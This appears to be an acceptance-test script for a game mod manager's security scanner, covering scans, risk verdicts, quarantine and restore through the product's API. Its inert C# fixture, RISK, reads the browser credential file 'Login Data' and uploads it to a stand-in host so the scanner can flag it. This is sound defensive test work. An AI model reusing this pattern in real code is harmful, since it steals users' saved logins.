"""Source/frozen acceptance using compiled inert fixtures and production APIs.

Only the owned test directory is modified. No fixture DLL or game EXE is run;
check_launch is exercised read-only, including advisory stale/high-risk reports.
This module is not imported or shipped by the application.
"""
import argparse
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import time
from types import SimpleNamespace
from uuid import uuid4


CLEAN = 'public interface IMod {} public static class Sample { public static int Value() { return 42; } }'
# Inert test IL: compile and parse only. Never invoke Sample.Observe.
RISK = '''using System.IO; using System.Net; public interface IMod {}
public static class Sample { public static void Observe() {
    byte[] data = File.ReadAllBytes("Login Data");
    using (var client = new WebClient()) { client.UploadData("https://example.invalid/fixture", data); }
} }'''


def compile_fixture(folder, name, source, *, executable=False):
    folder.mkdir(parents=True, exist_ok=True)
    code = folder / (name + '.cs')
    target = folder / (name + ('.exe' if executable else '.dll'))
    code.write_text(source, encoding='utf-8')
    compiler = Path(os.environ.get('WINDIR', 'C:/Windows')) / 'Microsoft.NET/Framework64/v4.0.30319/csc.exe'
    assert compiler.is_file(), 'Use the installed Windows Framework compiler; do not install dependencies'
    result = subprocess.run([str(compiler), '/nologo', '/target:' + ('winexe' if executable else 'library'),
        '/out:' + str(target), str(code)], capture_output=True, timeout=30,
        creationflags=subprocess.CREATE_NO_WINDOW)
    assert result.returncode == 0, result.stdout.decode(errors='replace')
    return target


def package(root, ident, dll, *, folder=None, dependency=None):
    target = root / (folder or ident)
    target.mkdir(parents=True)
    shutil.copyfile(dll, target / 'Main.dll')
    (target / 'manifest.xml').write_text(
        f'<Manifest><ID>{ident}</ID><Name>{ident}</Name><Author>隔离验收样本</Author><ModVersion>1.0</ModVersion>'
        '<Description>自编译、仅静态检查的验收样本；不会运行。</Description>'
        '<Assemblies><Assembly>Main.dll</Assembly></Assemblies><Capabilities></Capabilities>'
        + (f'<Prerequisites><Mod>{dependency}</Mod></Prerequisites>' if dependency else '<Prerequisites></Prerequisites>') + '</Manifest>', encoding='utf-8')
    return target


def rpc(context, command, **payload):
    return context.api.dispatch(dict(schema_version=1, request_id=uuid4().hex, command=command, payload=payload))


def ok(context, command, **payload):
    response = rpc(context, command, **payload)
    assert response['ok'], response
    return response['data']


def job(context, value):
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        current = ok(context, 'task.snapshot', task_id=value['task_id'])
        if current['state'] in {'succeeded', 'failed', 'cancelled'}:
            assert current['state'] == 'succeeded', current
            return current['data']
        time.sleep(.03)
    raise AssertionError('Job timed out')


def scan(context, identity, ids=None):
    ok(context, 'security.scan', installation_id=identity, **({'ids': ids} if ids else {}))
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        current = ok(context, 'security.activity', installation_id=identity)
        if not current['scanning']:
            assert current['operation']['state'] == 'completed', current
            return ok(context, 'security.status', installation_id=identity)
        time.sleep(.08)
    raise AssertionError('Security scan timed out')


def scanner_spy(context):
    """Observe production worker use without replacing parsing or its verdict."""
    counts = {'inspect_security': 0, 'inspect_approval': 0, 'approval_identity': 0}
    worker = context.mod_security.worker
    for name in counts:
        original = getattr(worker, name)
        def observed(*args, _name=name, _original=original, **kwargs):
            counts[_name] += 1
            return _original(*args, **kwargs)
        setattr(worker, name, observed)
    return counts


def check_launch_readonly(context, fixture, *, enabled_ids=None):
    from backend.app.native_api import installation
    path = Path(fixture['user']) / 'SaveFile.es3'
    before = path.read_bytes()
    with context.deployment_guards.operation(fixture['installation_id'], intent='launch') as lease:
        result = context.mod_security.check_launch(installation(context, fixture['installation_id']),
            check=lease.check, enabled_ids=enabled_ids)
    assert path.read_bytes() == before
    return result


def prepare(out):
    from backend.app.composition import DesktopContext
    from backend.app.paths import resolve_paths
    from backend.app.api import DesktopApi
    from backend.app import native_api
    from backend.native_mods.state import ORDER_TYPE
    out = Path(out).resolve()
    assert not out.exists(), 'Use a fresh owned evidence directory'
    out.mkdir(parents=True)
    clean = compile_fixture(out / 'build', 'Clean', CLEAN)
    risk = compile_fixture(out / 'build', 'Risk', RISK)
    executable = compile_fixture(out / 'build', 'Probably Stolen',
        'public static class Game { public static void Main() {} }', executable=True)
    game = out / 'owned/game'
    managed = game / 'Probably Stolen_Data/Managed'
    managed.mkdir(parents=True)
    (game / 'MonoBleedingEdge').mkdir()
    shutil.copyfile(clean, managed / 'Assembly-CSharp.dll')
    shutil.copyfile(executable, game / executable.name)
    user, workshop = out / 'owned/user', out / 'owned/workshop'
    user.mkdir(); workshop.mkdir()
    (user / 'SaveFile.es3').write_text(json.dumps(dict(modOrder=dict(__type=ORDER_TYPE, value=[]))), encoding='utf-8')
    target = package(game / 'Mods', 'security.demo', clean)
    package(game / 'Mods', 'security.dependent', clean, dependency='security.demo')
    package(workshop, 'security.workshop', clean, folder='1234567890')
    context = DesktopContext(resolve_paths(str(out / 'manager')))
    context.initialize()
    context.workshop_updates.close()
    context.choose_installation_folder = lambda _: str(game)
    context.api = DesktopApi(context)
    selected = ok(context, 'installation.choose', kind='manual')
    candidates = job(context, ok(context, 'installation.discover', source_handles=[selected['source_handle']]))['candidates']
    assert len(candidates) == 1 and candidates[0]['valid'], candidates
    identity = job(context, ok(context, 'installation.select', candidate_id=candidates[0]['candidate_id']))['installation']['installation_id']
    original = native_api.installation
    def resolve(ctx, ident):
        value = original(ctx, ident)
        assert Path(value['canonical_root']).resolve() == game
        return {**value, 'persistent_root': str(user), 'workshop_root': str(workshop)}
    native_api.installation = resolve
    # There is intentionally no Steam SDK/account and no external launch.
    context.workshop.release = lambda _: None
    context.workshop.opener = lambda _: False
    context.storage.accept()
    context.installations.auto_discover = lambda jobs, req: context.installations.use(jobs, req, identity)
    context.window_frame = SimpleNamespace(control=lambda op: dict(maximized=False, minimized=False))
    fixture = dict(installation_id=identity, game=str(game), user=str(user), workshop=str(workshop),
                   risk_dll=str(risk), target=str(target))
    return context, fixture


def seed_difference(context, fixture):
    identity = fixture['installation_id']
    status = scan(context, identity)
    assert len(status['items']) == 3 and all(not item['blocking'] for item in status['items']), status
    snap = ok(context, 'native.snapshot', installation_id=identity)
    ok(context, 'native.save', installation_id=identity, expected_revision=snap['revision'],
       enabled_ids=['security.demo', 'security.dependent'])
    target = Path(fixture['target'])
    shutil.copyfile(fixture['risk_dll'], target / 'Main.dll')
    (target / 'new-content.txt').write_text('new resource in the package', encoding='utf-8')
    return status


def run(out):
    context, fixture = prepare(out)
    report = dict(status='FAIL', scope='Production API + real isolated parser; self-authored inert fixtures; no game/Mod execution', checks=[])
    identity = fixture['installation_id']
    try:
        import backend.mod_security.service as service_module
        import backend.scanning.worker_client as worker_module
        report['product_modules'] = [service_module.__file__, worker_module.__file__]
        counts = scanner_spy(context)
        before = seed_difference(context, fixture)
        report['checks'].append('Explicit full manual inspection completed clean fixture scans')
        observed = dict(counts)
        stale = ok(context, 'security.detail', installation_id=identity, id='security.demo')
        assert stale['item']['state'] == 'stale' and not stale['item']['blocking'], stale
        assert check_launch_readonly(context, fixture)['checked_ids'] == []
        assert counts == observed
        report['checks'].append('Stale report is advisory: read-only launch check neither scans nor writes state')
        scan(context, identity, ['security.demo'])
        detail = ok(context, 'security.detail', installation_id=identity, id='security.demo')
        assert detail['report']['verdict'] == 'high_risk', detail
        assert any(f['rule'] == 'sensitive_read_and_send' for f in detail['report']['findings'])
        assert [r['path'] for r in detail['report']['diff']['modified']] == ['Main.dll']
        assert [r['path'] for r in detail['report']['diff']['added']] == ['new-content.txt']
        assert not detail['item']['blocking'] and detail['item']['blocking_reasons'] == []
        observed = dict(counts)
        assert check_launch_readonly(context, fixture)['checked_ids'] == []
        snap = ok(context, 'native.snapshot', installation_id=identity)
        saved = ok(context, 'native.save', installation_id=identity, expected_revision=snap['revision'],
                   enabled_ids=['security.demo', 'security.dependent'])
        assert all(m['approval']['detected'] is None for m in saved['mods'] if m['target_enabled'])
        assert counts == observed
        report['checks'].append('Manual selected inspection identifies high risk/diff; report does not block save or read-only launch check')
        preview = ok(context, 'security.dispose.preview', installation_id=identity, id='security.demo', mode='quarantine')
        assert preview['affected_ids'] == ['security.demo', 'security.dependent']
        disposed = ok(context, 'security.dispose', installation_id=identity, preview_id=preview['preview_id'])
        assert not Path(fixture['target']).exists()
        assert ok(context, 'native.snapshot', installation_id=identity)['enabled_ids'] == []
        from backend.mod_security import SecurityError
        try:
            check_launch_readonly(context, fixture, enabled_ids=['security.demo'])
        except SecurityError as exc:
            assert exc.code == 'SECURITY_QUARANTINED'
        else:
            raise AssertionError('Explicit quarantine must reject re-enabling that source')
        restored = ok(context, 'security.restore', installation_id=identity, record_id=disposed['record']['id'])
        assert Path(fixture['target']).is_dir() and restored['record']['status'] == 'restored'
        snapshot = ok(context, 'native.snapshot', installation_id=identity)
        assert snapshot['enabled_ids'] == [] and all(m['approval']['state'] != 'approved' for m in snapshot['mods'])
        assert ok(context, 'security.detail', installation_id=identity, id='security.demo')['item']['state'] == 'unscanned'
        saved = ok(context, 'native.save', installation_id=identity, expected_revision=snapshot['revision'],
                   enabled_ids=['security.demo', 'security.dependent'])
        assert next(m for m in saved['mods'] if m['id'] == 'security.demo')['approval']['approval_basis'] == 'user_enable'
        assert counts == observed
        report['checks'].append('Explicit local quarantine is enforced; restoration stays disabled/unapproved until user saves, with no required rescan')
        path = Path(fixture['workshop']) / '1234567890'
        files = {p.name: p.read_bytes() for p in path.iterdir()}
        preview = ok(context, 'security.dispose.preview', installation_id=identity, id='security.workshop', mode='quarantine')
        disposed = ok(context, 'security.dispose', installation_id=identity, preview_id=preview['preview_id'])
        assert files == {p.name: p.read_bytes() for p in path.iterdir()}
        assert disposed['record']['effect'] == 'logical_quarantine_files_remain'
        ok(context, 'security.restore', installation_id=identity, record_id=disposed['record']['id'])
        report['checks'].append('Workshop quarantine/restore preserves every package byte and never uses Steam SDK')
        assert counts['inspect_security'] >= 2 and counts['inspect_approval'] == counts['approval_identity'] == 0
        report.update(status='PASS', first_scan=before, high_risk_report=detail['report'], scanner_calls=counts)
    finally:
        context.close()
        Path(out, 'result.json').write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding='utf-8')
    return report


if __name__ == '__main__':
    root = Path(__file__).resolve().parents[3]
    sys.path.insert(0, str(root))
    parser = argparse.ArgumentParser()
    parser.add_argument('--out', required=True, type=Path)
    parser.add_argument('--serve', action='store_true')
    args = parser.parse_args()
    assert args.out.resolve().is_relative_to(root / '.preview')
    if args.serve:
        from tests.desktop.harness.formal_release_backend import serve
        context, fixture = prepare(args.out)
        seed_difference(context, fixture)
        serve(context, args.out.resolve(), fixture)
    else:
        print(json.dumps(run(args.out), ensure_ascii=False))
